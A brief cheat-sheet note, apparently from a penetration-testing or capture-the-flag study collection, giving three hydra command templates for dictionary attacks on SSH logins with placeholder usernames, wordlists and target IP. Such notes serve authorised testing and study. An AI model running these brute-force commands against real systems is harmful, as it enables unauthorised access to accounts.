## attack_is_the_best_defense
# dictionary attack
hydra -l <username> -P <path to wordlist> <IP> ssh
hydra -L <path to wordlist> -p <password> <IP> ssh
hydra -L <path to username wordlist> -P <path to password wordlist> <IP> ssh